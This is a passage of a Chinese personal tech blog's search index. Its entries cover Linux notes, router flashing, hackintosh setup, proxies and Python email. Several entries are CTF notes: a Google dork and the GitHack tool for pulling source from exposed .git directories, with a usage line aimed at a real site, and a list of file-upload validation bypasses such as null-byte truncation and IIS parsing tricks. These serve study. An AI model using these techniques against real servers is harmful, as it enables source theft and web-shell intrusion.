          <category> misc </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算符—输出字符的二进制</title>
      <link href="/2017/03/22/wei-yun-suan-fu-shu-chu-zi-fu-de-er-jin-zhi/"/>
      <url>/2017/03/22/wei-yun-suan-fu-shu-chu-zi-fu-de-er-jin-zhi/</url>
      
        <content type="html"><![CDATA[<p>使用移位运算符和位与运算符输出字符的二进制。 使用左移位(&lt;&lt;)可用128(二进制10000000)与字符做与运算，来求得每次最高位是0或1。 或使用右移位(&gt;&gt;)可用1(二进制00000001)与字符作与运算，来求得每次最低位是0或1。 示例代码如下</p><pre class="language-none"><code class="language-none">#include &lt;iostream&gt;using namespace std;int main(int argc, const char * argv[]) {    int i，bin[8];    char c = 'h';  //示例字符h(二进制01101000)    for(i = 7;i &gt;= 0;i--)    {        bin[i] = (c &amp; 1);  判断最低位0或1        c = c &gt;&gt; 1;   //右移一位    }    for(i = 0;i &lt; 8;i++)    {        cout &lt;&lt; bin[i];    }    cout &lt;&lt;endl;    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斐讯K2路由器刷openwrt使用闪讯拨号</title>
      <link href="/2017/03/17/fei-xun-k2-lu-you-qi-shua-openwrt-shi-yong-shan-xun-bo-hao/"/>
      <url>/2017/03/17/fei-xun-k2-lu-you-qi-shua-openwrt-shi-yong-shan-xun-bo-hao/</url>
      
        <content type="html"><![CDATA[<p>原文链接：<a href="http://www.right.com.cn/forum/thread-191833-1-1.html">http://www.right.com.cn/forum/thread-191833-1-1.html</a> 支持的版本</p><pre class="language-none"><code class="language-none">V22.3.15.128V22.3.15.232 V22.3.17.148V22.4.2.8 V22.4.2.9</code></pre><ul><li>  若是固件版本高于要求的版本，先下载v22.4.4.9在手动升级中导入固件并升级</li><li>  固件版本达到要求以后在备份恢复中刷入tianbaoha_breed_ssh.dat，重启后密码变为tianbaoha</li><li>  这个时候breed已经刷进去了，如果需要刷入其他固件，可以再手动升级中直接刷入</li><li>  接下来是闪讯拨号设置：</li><li>  刷入openwrt固件后，配置wan口为pppoe，并填好闪讯账号密码，设置好无线名称密码，去除闪讯心跳</li><li>  使用winscp连接路由器，用户名root，密码admin</li><li>  找到/etc/config目录下的network打开 &nbsp;在option passwd下面添加一行option pppd_options ‘plugin sxplugin.so’</li><li>  找到/usr/lib/pppod/2.4.7目录，然后将对应地区的sxplugin.so文件拖进去。权限设置成0755 &nbsp; ALL DONE!重启GOOD LUCK!</li></ul>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读linux 私房菜记（2）</title>
      <link href="/2017/02/16/du-linux-si-fang-cai-ji-1/"/>
      <url>/2017/02/16/du-linux-si-fang-cai-ji-1/</url>
      
        <content type="html"><![CDATA[<p>基础正规表示法：</p><ol><li> ^word &nbsp; &nbsp;意义:待搜寻的字符串(word)在行首</li><li> word$ &nbsp; &nbsp;意义:待搜寻的字符串(word)在行尾</li><li> &nbsp; &nbsp;. &nbsp; 代表『一定有一个任意字符』的字符</li><li> &nbsp; &nbsp;\ &nbsp; &nbsp;跳脱字符，将特殊符号的特殊意义去除</li><li> * 重复零个到无穷多个的前一个 RE 字符</li><li> [list] 字符集合的 RE 字符，里面列出想要撷取的字符</li><li> [n1-n2] &nbsp; 字符集合的 RE 字符，里面列出想要撷取的字符范围</li><li> [^list] &nbsp; 字符集合的 RE 字符，里面列出不要的字符串或范围</li><li> \{n,m\} &nbsp; 意义:连续 n 到 m 个的『前一个 RE 字符』 意义:若为 \{n\} 则是连续 n 个的前一个 RE 字符 意义:若是 \{n,\} 则是连续 n 个以上的前一个 RE 字符</li><li> sed 工具 &nbsp; sed [-nefr] [动作]</li></ol><p>延伸正规表示法：</p><ol><li> 重复『一个或一个以上』的前一个 RE 字符</li><li> ? 『零个或一个』的前一个 RE 字符</li><li> 用或( or )的方式找出数个字符串</li><li> ()找出『群组』字符串</li><li> ()+ 多个重复群组的判别</li><li> 工具 &nbsp;print &nbsp;awk &nbsp; &nbsp;pr</li></ol><p>Shell Script 的学习</p><ol><li> source 执行与 sh 执行的差异：前者当前bash执行 &nbsp; 后者fork出一个新的子程序后执行</li><li> test 指令 &nbsp;以及[ &nbsp;]的使用</li><li> if…then &nbsp;; &nbsp;case….esac ; &nbsp;funtion &nbsp; ; while do &nbsp;done ;until do done &nbsp; ; &nbsp;for &nbsp;do &nbsp;done ;</li><li> Shell Script 追踪与debug</li></ol><p>Linux 账号与群组</p><ol><li> 有效与初始群组 &nbsp;有效群组的观察使用groups &nbsp; 切换使用newgrp &nbsp;群组名</li><li> 新增成员 useradd &nbsp; 删除成员 userdel</li><li> 查询使用者使用 &nbsp;id &nbsp;；w ; who; last; lastlog</li><li> 与使用者对谈 write;mesg;wall</li></ol><p>例行性工作排程(at cron)</p><ol><li> 仅执行一次的工作排程at &nbsp; allow deny等文件</li><li> 循环执行的工作排程 &nbsp;cron &nbsp;* * * * * 命令</li><li> 可唤醒停机期间的工作任务 &nbsp;anacron</li></ol><p>&nbsp; &nbsp; &nbsp; grep -rni “content” *&nbsp; &nbsp;迭代遍历目录下文件中保护该字符串的文件</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 一键搭建ss服务端</title>
      <link href="/2017/02/14/linux-yi-jian-da-jian-ss-fu-wu-duan/"/>
      <url>/2017/02/14/linux-yi-jian-da-jian-ss-fu-wu-duan/</url>
      
        <content type="html"><![CDATA[<p>Debian参考<a href="https://teddysun.com/392.html">https://teddysun.com/392.html</a> 安装方式：</p><pre class="language-none"><code class="language-none">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</code></pre><pre class="language-none"><code class="language-none">chmod +x shadowsocks.sh</code></pre><pre class="language-none"><code class="language-none">./shadowsocks.sh 2&gt;&amp;1  tee shadowsocks.log</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> python </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读linux 私房菜记（1）</title>
      <link href="/2017/02/13/linux-si-fang-cai-ji/"/>
      <url>/2017/02/13/linux-si-fang-cai-ji/</url>
      
        <content type="html"><![CDATA[<p>第四章：初识Linux</p><ol><li> 几个重要的热键 Tab：命名补全与文件（夹）名补全 Ctrl-c：停止 Ctrl-d：相当于exit，停止输入 shift-[page up/down]：前后翻页</li><li> man page与info page</li><li> 简单的文本编辑器nano</li><li> 正确关机的方法sync-shutdown/poweroff/reboot/halt</li></ol><p>第五章：文件权限与目录配置</p><ol><li> 拥有者 &nbsp;群组 &nbsp;其他人 &nbsp;root 的概念 用户的身份与群组记录文件/etc/passwd &nbsp; 密码则是在/etc/shadow</li><li>文件权限的概念 drwxr-xr-x&nbsp; &nbsp; 5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;flypig staff 170 &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 2 10 23:01 Public 【权限】 &nbsp; &nbsp; &nbsp;连接 数 &nbsp; 拥有者 &nbsp; &nbsp; 群组 &nbsp; 文件容量 &nbsp; &nbsp; 修改日期 &nbsp; &nbsp;文档名 d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;rwx r-x r-x 文档类型 &nbsp; &nbsp;拥有者权限 &nbsp; &nbsp; &nbsp;拥有者所在组权限 &nbsp; &nbsp; &nbsp;其他人权限 正规文件：- 目录：d 连接档：l 区块设备档：b 字符设备文件：c 资料接口文件：s 数据输送文件：p</li><li> chgrp:改变所属群组 chown:改变所有者 chmod:改变文件权限，SUID,SGID,SBIT等等</li></ol><p>第六章：文件内容的查阅</p><ol><li> cat - tac &nbsp; nl &nbsp; more - less &nbsp; head - tail &nbsp; od（查阅非纯文本文档）</li><li> touch 修改文件时间或建立新文件</li><li> umask预设权限</li><li> 文件隐藏属性以及特殊权限SUID,SGID,SBIT</li><li> file命令观察文件的类型</li><li> 脚本文件名搜索：which command 搜索文件：whereis &nbsp; 【-bsmu】文件名</li><li> 挂载mount &nbsp; unmount &nbsp;开机自动挂载/etc/fstab</li></ol><p>第八章：打包备份</p><ol><li> 打包：tar -zcv -f filename.tar.gz 要被压缩的文件或文件夹 查询：tar -ztv -f filename.tar.gz 解压：tar -zxv -f filename.tar.gz &nbsp;-C 预解压的目录</li><li> Vim 一般指令模式常用命令 Ctrl + f = Page Down &nbsp; &nbsp; &nbsp;Ctrl + b = Page Up （数字0）= Home 移动到行首 &nbsp; $ = End 移动到行尾 G 移动到文件最后一行 &nbsp; &nbsp; gg=1G移动到文件第一行 /word 光标向下搜索word这个词 &nbsp; &nbsp; &nbsp; ?word 光标向上搜索word这个词 :n1,n2s/word1/word2/g &nbsp; &nbsp; &nbsp;行n1到行n2之间使用word2替代word1 &nbsp; &nbsp;g后面加c需确认 x = del 删除后面一个字符 &nbsp; &nbsp; X向前删除一个字符 dd删除一整列 &nbsp; &nbsp;ndd删除连续n行 &nbsp; &nbsp;yy复制光标所在行 &nbsp; &nbsp;nyy复制光标向下n行 p 光标下粘贴 &nbsp; &nbsp; P光标上粘贴 &nbsp; &nbsp;u撤销上一个动作 &nbsp; &nbsp; &nbsp;Ctrl+r=.（小数点） 重做上一个动作</li><li> vim额外功能 v字符选择 &nbsp; &nbsp;V行选择 &nbsp; &nbsp; Ctrl+v &nbsp;区块选择（可选长方形） :sp &nbsp;窗口拆分 <del>/.vimrc或者</del>/.viminfo vim的环境设定</li></ol><p>认识与学习bash</p><ol><li> 命令别名 alias &nbsp;ll=’ls -al’ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 取消 &nbsp;unalias &nbsp; ll &nbsp; 若设定永久生效改~/.bashrc &nbsp;或者.bash_profile</li><li> history -c 清楚当前shell中所有历史命令</li><li> bash 进站欢迎信息 &nbsp;/etc/issue &nbsp; /etc/motd(所有用户登入会显示)</li><li> 通配符遇特殊符号 &nbsp; *匹配无穷多个任意字符 &nbsp; ?有且仅有一个 &nbsp; [abcd] 其中一个 &nbsp;[^abc]反向选择 [ 0-9] 顺序编码内的文字</li><li> 数据流重导向 &nbsp; $? &nbsp; &nbsp;&amp;&amp; &nbsp; &nbsp; &nbsp;</li><li> 管线命令： 截取：cut &nbsp; grep &nbsp; 排序：sort &nbsp; wc &nbsp; uniq &nbsp; 双向重导向：tee 字符转换： tr &nbsp;col &nbsp; &nbsp;join &nbsp; paste &nbsp; expand 分区命令 ：split &nbsp; 参数代换：xargs &nbsp; &nbsp; stdin和stdout可以使用 &nbsp;- &nbsp; 替代</li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宏碁vn7 591 51ww安装黑苹果macOS Sierra(10.12.2)</title>
      <link href="/2017/02/11/hong-qi-vn7-591-51ww-an-zhuang-macos-sierra10-12-2/"/>
      <url>/2017/02/11/hong-qi-vn7-591-51ww-an-zhuang-macos-sierra10-12-2/</url>
      
        <content type="html"><![CDATA[<p>安装所用到文件以及方法来自<a href="http://blog.163.com/deadbull@126/blog/static/1669599372015123006778/">http://blog.163.com/deadbull@126/blog/static/1669599372015123006778/</a></p><p>以下只是记录一下自己安装的过程，留份防忘</p><p>笔记本 &nbsp; &nbsp;： &nbsp;Acer VN7-591G-51ww</p><p>架构 &nbsp; &nbsp; &nbsp; ： &nbsp;haswell CPU &nbsp; &nbsp; &nbsp; &nbsp;： &nbsp;Intel(R) Core(TM) i5-4210H 内存 &nbsp; &nbsp; &nbsp; ： &nbsp;DDR3-1600 8G 显卡 &nbsp; &nbsp; &nbsp; ： &nbsp;Intel HD 4600 + NVIDIA GeForce GTX 860M 声卡 &nbsp; &nbsp; &nbsp; ： &nbsp;Realtek ALC283 @ Intel Lynx Point PCH - High Definition Audio Controller [C-2] WLAN &nbsp; &nbsp; ： &nbsp;Qualcomm Atheros AR5BWB222 Wireless&nbsp; LAN &nbsp; &nbsp; &nbsp; &nbsp;： &nbsp;Realtek RTL8168/8111 PCI-E Gigabit Ethernet Adapter</p><p>硬盘 &nbsp; &nbsp; &nbsp; ： &nbsp;SSD（120GB）+HD（1T）</p><p>引导环境 ： &nbsp;UEFI+GPT+CLOVER</p><ol><li> 首先，下载下来 &nbsp;Clover3961_U_macOS S 10.12.2(16C67)正式版 &nbsp;（链接: <a href="https://pan.baidu.com/s/1eSbvNrG">https://pan.baidu.com/s/1eSbvNrG</a> 密码: ns2a）和一些工具（用到再做说明）</li><li> 在win的环境下，使用transmac 11.9 将U盘（大于8g）格式化成hfs+格式，并且将镜像刻录进去</li><li> 刻录完成后，替换里面的efi文件夹即可，之后可以用这个U盘来安装os x系统，最好提前分一个efi分区，且要大于200M，否则磁盘工具里面无法抹除硬盘</li><li>在进入安装的时候，终端里面设置date： <pre class="language-none"><code class="language-none">date 122014102015.30</code></pre> 关闭SIP： <pre class="language-none"><code class="language-none">csrutil disable</code></pre></li><li>进入系统后，终端设置允许安装任何来源程序 <pre class="language-none"><code class="language-none">sudo spctl --master-disable</code></pre></li><li> 挂载efi分区，将efi文件复制进去</li><li> 接着配置声卡驱动：使用AppleHDA PatcherV1.6版本以上，生成自己声卡的相关文件（右边笔记本选项里面选择的alc283）点patch后桌面生成一个MironAudio文件夹，aDummyHDA.kext和CodecCommander.kext放在了/L/E文件夹下面，AppleHDA.kext放在了/S/L/E文件夹下面，放完之后使用Kext_Utility重建缓存，修复权限。将efi里面的config.plist（使用的文本编辑器手动添加）和dsdt打上了给出的补丁（使用的maciasl）。重启即可</li><li> 蓝牙默认打开，关闭按钮灰色不可选，浪费不了多少电。wifi无解，大神说换DW1830三天线，支持ac双频，而且可以使用hanoff，具体参考原贴中链接。 &nbsp;更新：后来某宝买了dw1830，让老板送了一根天线，三天到货。拆机装上，clover里面放入了蓝牙的驱动（wifi免驱动）参考原文链接</li><li> 使用软件的版本 clover configrator请升级到4.32.1版本以上 kext utility请升级到2.6.6版本及以上</li><li> 关于iMessage和FaceTime登录的问题，我使用的是一个很多人用过的三码，具体使用方法见这个视频 <a href="http://v.youku.com/v_show/id_XMTI4MDE3MDY4MA==.html">http://v.youku.com/v_show/id_XMTI4MDE3MDY4MA==.html</a></li><li> 后来发现在win下重启过来声卡驱动不了了，必须在os x下重启一次才生效。后来在这错的command.kest里面加了一个dsdt-alc283的补丁，详见这几个帖子</li></ol><pre><code><pre class="language-none"><code class="language-none">https://github.com/RehabMan/EAPD-Codec-Commander/commit/2f03e9d51a70c68642cec020d3afe54bd2a6385e</code></pre>放在CodecCommander.kext/contents/ &nbsp;里面就可以了</code></pre><ol start="12"><li> 10.12 SSD 开启TRIM</li></ol><pre><code><pre class="language-none"><code class="language-none">sudo trimforce enable</code></pre></code></pre><ol start="13"><li> 附带pcbeta &nbsp;hosts</li></ol><pre><code><pre class="language-none"><code class="language-none">218.93.127.136 pcbeta.com 218.93.127.136 uc.pcbeta.com 218.93.127.136 m.pcbeta.com 218.93.127.136 web.pcbeta.com 218.93.127.136 i.pcbeta.com 218.93.127.136 bbs.pcbeta.com 218.93.127.136 www.pcbeta.com 218.93.127.136 mac.pcbeta.com 218.93.127.136 cdn.pcbeta.attachment.inimc.com 218.93.127.136 cdn.pcbeta.static.inimc.com 218.93.127.136 cdn.pcbeta.css.inimc.com 218.93.127.136 static.template.pcbeta.com</code></pre></code></pre><ol start="14"><li> 挂载efi分区</li></ol><pre><code><pre class="language-none"><code class="language-none">diskutil listsudo mkdir /Volumes/EFI/ &amp;&amp; sudo mount -t msdos /dev/disk0s1 /Volumes/EFI</code></pre></code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> OS X </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> tools </tag>
            
            <tag> OS X </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu安装中文man手册</title>
      <link href="/2017/01/23/ubuntu-an-zhuang-zhong-wen-man-shou-ce/"/>
      <url>/2017/01/23/ubuntu-an-zhuang-zhong-wen-man-shou-ce/</url>
      
        <content type="html"><![CDATA[<p>man默认是英文的，但ubuntu的源里也有中文版的。以下是配置方法: 1)&nbsp; 终端输入</p><pre class="language-none"><code class="language-none">sudo apt-get install manpages-zh</code></pre><p>2)&nbsp; 安装后修改配置文件</p><pre class="language-none"><code class="language-none">sudo gedit /etc/manpath.config</code></pre><p>3)&nbsp; 将所有的/usr/share/man替换为/usr/share/man/zh_CN 4)&nbsp; 保存即可。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt固件路由器设置定时重启</title>
      <link href="/2017/01/20/openwrt-gu-jian-lu-you-qi-she-zhi-ding-shi-chong-qi/"/>
      <url>/2017/01/20/openwrt-gu-jian-lu-you-qi-she-zhi-ding-shi-chong-qi/</url>
      
        <content type="html"><![CDATA[<p>计划任务中添加命令</p><pre class="language-none"><code class="language-none">00 04 * * * sleep 10 &amp;&amp; touch /etc/banner &amp;&amp; reboot  //每天凌晨4点自动重启</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2017/01/1TG1HZIEBZ1DPVL4A2-300x121.png"> 然后在ssh连接到路由器，执行</p><pre class="language-none"><code class="language-none">/etc/init.d/cron restart</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python发送通过qq邮箱服务器发送邮件</title>
      <link href="/2017/01/11/shi-yong-python-fa-song-tong-guo-qq-you-xiang-fu-wu-qi-fa-song-you-jian/"/>
      <url>/2017/01/11/shi-yong-python-fa-song-tong-guo-qq-you-xiang-fu-wu-qi-fa-song-you-jian/</url>
      
        <content type="html"><![CDATA[<pre class="language-none"><code class="language-none"># coding:utf8import smtplibfrom smtplib import SMTP_SSLfrom email.header import Headerfrom email.mime.text import MIMETextmail_info = {    "from": "xxx@qq.com",    "to": "xxx@qq.com",    "hostname": "smtp.qq.com",    "username": "xxx@qq.com",    "password": "xxx",    "mail_subject": "test",    "mail_text": "hello, this is a test email, sended by py",    "mail_encoding": "utf-8"}if __name__ == '__main__':    # 这里使用SMTP_SSL就是默认使用465端口    smtp = SMTP_SSL(mail_info["hostname"])    smtp.set_debuglevel(1)    smtp.ehlo(mail_info["hostname"])    smtp.login(mail_info["username"], mail_info["password"])    msg = MIMEText(mail_info["mail_text"], "plain", mail_info["mail_encoding"])    msg["Subject"] = Header(mail_info["mail_subject"], mail_info["mail_encoding"])    msg["from"] = mail_info["from"]    msg["to"] = mail_info["to"]    smtp.sendmail(mail_info["from"], mail_info["to"], msg.as_string())    smtp.quit()</code></pre><p>更多例子<a href="https://github.com/michaelliao/learn-python/tree/master/email">https://github.com/michaelliao/learn-python/tree/master/email</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> python </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.git泄露利用工具</title>
      <link href="/2016/12/25/git-xie-lu-li-yong-gong-ju/"/>
      <url>/2016/12/25/git-xie-lu-li-yong-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>介绍 git 在初始化代码库的时候，会在当前目录下面产生一个.git的隐藏目录文件，用来记录代码的变更等。 同时使用这个文件，可以恢复各个版本的代码。所以如果 .git 泄漏的话，就可能同时泄漏了源代码。 测试 先手工测试下，使用 google 搜索一个泄漏的 .git 文件。</p><pre class="language-none"><code class="language-none">google: ".git" intitle:"index of"</code></pre><p>项目地址： <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> 用法示例</p><pre class="language-none"><code class="language-none">GitHack.py http://www.openssl.org/.git/</code></pre><p>新增一个工具，可以获取历史版本记录 <a href="https://github.com/gakki429/Git/_Extract">https://github.com/gakki429/Git\_Extract</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> python </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决git太慢的方法</title>
      <link href="/2016/12/25/jie-jue-git-tai-man-de-fang-fa/"/>
      <url>/2016/12/25/jie-jue-git-tai-man-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>github.com 上有两种源码获取方式，一是 git clone，一是直接下载 master.zip，后者明显速度快于前者，可以考虑； 1.用 proxychains 这类透明代理，间接走系统中运行的代理工具中转； proxychains安装</p><pre class="language-none"><code class="language-none">git clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configuremake &amp;&amp; make installcp ./src/proxychains.conf /etc/proxychians.confcd .. &amp;&amp; rm -rf proxychains-ng</code></pre><p>编辑proxychains配置</p><pre class="language-none"><code class="language-none">vim /etc/proxychains.conf</code></pre><p>将socks4 127.0.0.1 9095改为</p><pre class="language-none"><code class="language-none">socks5  127.0.0.1 1080  //1080改为你自己的端口</code></pre><p>使用方法</p><pre class="language-none"><code class="language-none">proxychains4 wget http://xxx.com/xxx.zip</code></pre><p>2.用 git 内置代理，直接走系统中运行的代理工具中转，比如，你的 SS 本地端口是 1080，那么可以如下方式走代理</p><pre class="language-none"><code class="language-none">git config --global http.proxy socks5://127.0.0.1:1080git config --global https.proxy socks5://127.0.0.1:1080</code></pre><p>也可以如下方式停走代理</p><pre class="language-none"><code class="language-none">git config --global http.proxy ""git config --global https.proxy ""</code></pre><p>&nbsp;</p><h2 id="不装任何插件，终端中执行命令（配合ss使用）"><a href="#不装任何插件，终端中执行命令（配合ss使用）" class="headerlink" title="不装任何插件，终端中执行命令（配合ss使用）"></a>不装任何插件，终端中执行命令（配合ss使用）</h2><pre class="language-none"><code class="language-none">export http_proxy="http://127.0.0.1:1087"export https_proxy="http://127.0.0.1:1087"</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gpt+uefi环境下安装win10+deepin双系统</title>
      <link href="/2016/12/23/gptuefi-huan-jing-xia-an-zhuang-win10deepin-shuang-xi-tong/"/>
      <url>/2016/12/23/gptuefi-huan-jing-xia-an-zhuang-win10deepin-shuang-xi-tong/</url>
      
        <content type="html"><![CDATA[<p>配制清单：</p><ul><li>  机型 &nbsp;宏碁vn7-591-51ww</li><li>  双硬盘：三星固态（win10）+自带机械硬盘（deepin）</li><li>  环境：ssd分区为esp+win10系统盘+win10软件安装盘；机械硬盘deepin（boot+swap+/系统）分区+公共分区</li></ul><p>安装过程：</p><ol><li>首先我是先装的win10，再装的deepin。装完后我电脑的引导很奇怪，不管怎么改都是直接启动了win10。easyuefi等也不行 然后知道了电脑直接引导了efi下的microsoft里面的efi文件，并没有优先 <em>efi\boot</em> 里面的efi。我是后来把microsoft整个文件夹放到了win10系统盘根目录下，把esp分区的efi中的microsoft文件夹删掉了，并且用grub的引导文件替换了boot里面默认的这样子就是要用linux的grub引导了。(17-2-29补充：后来发现顽固的win10自己在efi分区生成了一个Microsoft引导文件夹，于是直接把Microsoft里面的bootmgfw.efi给替换成了grub的引导sha什么的.efi)进入deepin系统，终端运行 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.comwp-content/uploads/2016/12/1-300x64.png"> <pre class="language-none"><code class="language-none">sudo gedit /etc/grub.d/40_custom &nbsp; //添加efi引导文件</code></pre> <pre class="language-none"><code class="language-none">sudo gedit /etc/default/grub &nbsp; //这里可以更改默认启动顺序</code></pre> 这个文件是可以自己添加引导，在下面加入类似这样的代码 <pre class="language-none"><code class="language-none">if [ "${grub_platform}" == "efi" ]; thenmenuentry "Windows 10" {set root='(hd0,gpt2)'chainloader /EFI/Microsoft/Boot/bootmgfw.efi}fi</code></pre> set root中的是指efi引导所在分区，我的是再第一块硬盘第二个分区，所以写hd0,gpt2，接着更新下grub列表 <pre class="language-none"><code class="language-none">sudo update-grub</code></pre></li><li> 引导是安装过后遇到的问题，安装deepin过程还是挺简单的。刻录在u盘里面，直接再uefi模式下启动安装就可以了。得先准备好一个空闲的分区，分配boot分区，swap交换分区，和根目录分区。</li><li>装好系统后的一些小问题： 1.windows和linux会有时间差8个小时，可以再windows管理员权限的cmd中执行 <pre class="language-none"><code class="language-none">Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1</code></pre> 2.需要用到科学上网，deepin的商店里面直接就有gui的shadowsockets可以安装，或者是githubclone下来自己装。装好后，我还配置了pac模式的科学上网。是用的是genpac 方法一： 终端运行 <pre class="language-none"><code class="language-none">git clone https://github.com/JinnLynn/GenPAC</code></pre> 方法二： 需要现安装python-pip <pre class="language-none"><code class="language-none">pip install genpacpip install --upgrade&nbsp;genpac</code></pre> 安装好后，新建一个文件夹，用来放置自动生成的pac文件，建好以后cd进去，新建一个&nbsp;user-rules.txt，之后执行 <pre class="language-none"><code class="language-none">genpac -p "SOCKS5 127.0.0.1:1080" --gfwlist-proxy="SOCKS5 127.0.0.1:1080" --output="autoproxy.pac" --gfwlist-url="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" --user-rule-from="user-rules.txt"</code></pre> 之后设置全局代理，如图 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.comwp-content/uploads/2016/12/2-300x221.png"> 并且应用到系统</li><li> chrome使用了adfree.player.online插件，firefox使用了adblock</li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2016/12/08/wen-jian-bao-han-lou-dong/"/>
      <url>/2016/12/08/wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 &nbsp; 博文<a href="https://www.secpulse.com/archives/3206.html">https://www.secpulse.com/archives/3206.html</a></p><pre class="language-none"><code class="language-none">&lt;?php function foo() { echo "Hello World!\\n"; }?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞利用</title>
      <link href="/2016/12/08/wen-jian-shang-chuan-lou-dong-li-yong/"/>
      <url>/2016/12/08/wen-jian-shang-chuan-lou-dong-li-yong/</url>
      
        <content type="html"><![CDATA[<p>文件上传攻击的原理 由于服务器端没有对用户上传的文件进行正确的处理，导致攻击者可以向某个可通过 Web 访问的目录上传恶意文件，并且该文件可以被Web服务器解析执行。</p><p>绕过方法：</p><ul><li>  客户端javascript验证的可使用brup代理</li><li>  服务端MIME类型检测同样可以使用brup修改Content-type来绕过</li><li>绕过服务端文件扩展名检测：<ol><li> 结合目录攻击比如filename = “test.asp/test.jpg”之类</li><li> 找黑名单扩展名的漏网之鱼 - 比如上面就漏掉了 asa 和 cer 之类</li><li> 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li><li> 特别文件名构造 - 比如发送的 http 包里把文件名改成 help.asp. 或 help.asp_(下划线为空格)，这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改， 然后绕过验证后，会被 windows 系统自动去掉后面的点和空格。</li><li> 0x00 截断绕过 - 这个是基于一个组合逻辑漏洞造成的</li><li> 双扩展名解析绕过攻击 - 基于 web 服务的解析逻辑 比如上传x.php.rar等文件</li><li> 系统文件路径长度限制：windows 259个bytes linux 4096个bytes</li><li> 这里利用了IIS的解析漏洞，当文件名为1.asp;1.jpg时，IIS会将此文件解析为1.asp，文件名被截断，导致脚本被执行。</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
